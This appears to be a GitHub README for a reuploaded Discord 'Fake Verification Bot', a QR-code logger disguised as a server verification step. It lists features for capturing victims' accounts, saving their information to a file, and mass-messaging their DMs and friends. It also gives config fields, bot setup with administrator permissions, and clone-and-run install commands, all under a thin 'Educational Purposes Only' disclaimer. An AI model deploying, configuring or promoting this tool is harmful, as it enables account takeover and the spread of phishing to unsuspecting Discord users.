<h1 align="center">[Discord] - Fake Verification Bot (V1.0.0)</h1>
<h2 align="center">REUPLOADED FROM ASTRAADEV</h2>

<p align="center">
  Its a QR-LOGGER for Discord hidden as a "verification proccess"
</p>


## Disclaimer
`Educational Purposes Only`<br>
`Astraa & I are not responsible for any damage`
`I (LuyaTools/Blizz) dont own this tool. It fully belongs to Astraa`<br>
`https://github.com/AstraaDev/`

## Features

- Async QR Code Management
- Using Websockets (no browser used)
- Personal QR Code (visible only to the person passing the verification)
- Saves the information in a json file
- Can gives a role to the user after his verification
- Can send a message to all the user's DMs + all user's Friend
- Possibility to define a logs channel
- Easy to use + Intuitive UI (like my [SelfBot](https://github.com/AstraaDev/Discord-SelfBot))

## How To Setup/Install

#### First of all please set your informations in the config.json file!
```json
{
    "botToken": "BOT-TOKEN-HERE", #For more information, read below
    "logs_channel_id": "LOGS-CHANNEL-ID-HERE", #ID of the channel to which the bot logs will be sent
    
    "prefix": "PREFIX-HERE",
    "command_name": "COMMAND-NAME-HERE",
    
    "give_role": false, #Can take the value: true or false
    "role_name": "ROLE-NAME-HERE", #Name of the role you want to give to the user after scanning the QR Code
    
    "mass_dm": 0, #Can take the value: 0 (Disable), 1 (current user's dms), 2 (user's friends), 3 (Current DMs + Friends)
    "message": "MESSAGE-HERE" #Message you want to send to all user's DMs after scanning the QR code
}
```
#### Set up and invite your Bot.
- Create a bot on the [Discord Developer page](https://discord.com/developers/applications)
- Enable all instances in the "Bot" tab
- Invite your bot using this [invite](https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=applications.commands%20bot) (replace CLIENTID by the ID of your Bot)

#### 1st・Installation (Automated installation)
```
Launch the setup.bat file. A new file will be created. You will only have to launch it.
```

#### 2nd・Installation (Manual installation)
```
$ git clone https://github.com/AstraaDev/Fake-Verification-Bot.git
$ python -m pip install -r requirements.txt
$ python main.py
```


## Example
![verification_example.png](https://cdn.discordapp.com/attachments/826581697436581919/989174080332787712/unknown.png?size=4096)
